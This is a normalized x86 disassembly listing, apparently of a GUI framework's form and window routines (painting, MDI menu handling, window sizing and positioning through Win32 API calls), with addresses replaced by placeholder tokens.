push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_44a180
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_44a180
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_44a180
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_44a180
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_44a180
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_44a180
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_45c208
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_462a30
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424af4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_46237d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_462360
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_4251ec
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_42508c
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_45d6f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462367
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4251ec
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_45c208
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_462a30
call sub_44f7b4
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4624ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_424af4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_462484
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_462467
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_4251ec
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_42508c
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46246e
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4251ec
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_44f7b4
mov esi eax
sub_46248b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call ReleaseDC
retn
sub_46253c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_462588
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_462a64
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_462ab0
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_4625c8
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_462796
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_4249d8
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44d468
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_448af8
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4478c8
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_46253c
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_4249d8
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_462a64
test eax eax
je r-xdata
push ebp
call sub_46253c
pop ecx
push ebp
call sub_46253c
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_462588
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_45f8a0
jmp r-xdata
sub_4627a8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_460a70
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_462814
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_46110c
mov eax ebx
call sub_44fab8
test al al
je r-xdata
mov eax ebx
call sub_4217a8
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_44f7b4
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_44c5d8
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_44f7b4
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_42177c
call sub_45cd4c
mov edx esi
mov eax ebx
call sub_42177c
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
sub_4628ac
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_462929
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_462934
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44cd54
sub_462960
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_44cd54
xor edx edx
jmp r-xdata
mov eax esi
call sub_460bec
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_462998
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_448790
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_44cd54
sub_4629dc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_44889c
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_462a30
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_445e6c
sub_462a64
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_4665d4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_4665c0
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_462ab0
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_4665d4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4665c0
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_462b00
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_418744
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_462b30
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_44f7b4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_4665a4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_4665a4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_462b00
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_4665a4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_466590
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_4188a0
call sub_403368
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_466590
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_466590
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_466590
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_462c34
push ebx
mov ebx eax
mov eax ebx
call sub_462c2c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_429264
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_462c5c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_44cd0c
mov dl 0x1
mov eax esi
call sub_462fc0
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_46303c
mov edx eax
mov eax esi
call sub_449154
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_44cea8
mov dl 0x1
mov eax esi
call sub_461fe0
sub_462cdc
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_44f7b4
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_459348
mov edi eax
mov eax ebp
call sub_44f7b4
push eax
call DrawMenuBar
sub_462d58
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_421254
xor edx edx
mov eax ebx
call sub_45ace0
sub_462d7c
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_462cdc
mov eax edx
mov edx ebx
call sub_421254
sub_462da4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462f6a
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_4665d4
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_45c894
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4665c0
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_421254
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4665c0
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
call sub_403b1c
mov eax ebx
call sub_44fab8
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_44f7b4
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_462cdc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462f71
lea eax [ ebp - 0x10 ]
call sub_404164
retn
mov dl 0x1
mov eax ebx
call sub_463e68
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_44fab8
test al al
je r-xdata
mov eax ebx
call sub_44fab8
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_44f7b4
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_44f7b4
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_44f7b4
mov edx eax
mov eax esi
call sub_45c894
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_44f7b4
push eax
call SetMenu
sub_462f8c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_462f78
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_462fe8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_462fdc
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_463054
push ebx
mov ebx eax
mov eax ebx
call sub_44edcc
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_46303c
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_46303c
mov edx eax
mov eax ebx
call sub_449154
mov edx 0xff00000f
mov eax ebx
call sub_449154
pop ebx
retn
sub_4630d8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_44f7b4
push eax
call ShowWindow
sub_463118
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_462b30
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_462b30
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_4665a4
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_466590
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_462b30
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_466590
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4665a4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_466590
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_466590
call sub_466294
push eax
mov edx esi
mov eax [ rw-data ]
call sub_466590
call sub_466278
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_466590
call sub_466260
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_466590
call sub_466260
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_466590
call sub_466260
push eax
mov edx esi
mov eax [ rw-data ]
call sub_466590
call sub_4662ac
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_466590
call sub_466294
push eax
mov edx esi
mov eax [ rw-data ]
call sub_466590
call sub_466278
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_466590
call sub_466260
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_466590
call sub_4662ac
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_466590
call sub_466294
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_466590
call sub_466294
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_466590
call sub_466294
push eax
mov edx esi
mov eax [ rw-data ]
call sub_466590
call sub_466278
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_466590
call sub_466260
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_466590
call sub_4662ac
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_466590
call sub_466260
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_466590
call sub_4662ac
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_466590
call sub_466294
push eax
mov edx esi
mov eax [ rw-data ]
call sub_466590
call sub_466278
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_46346c
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_460a20
mov edx esi
mov eax edi
call sub_465e10
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
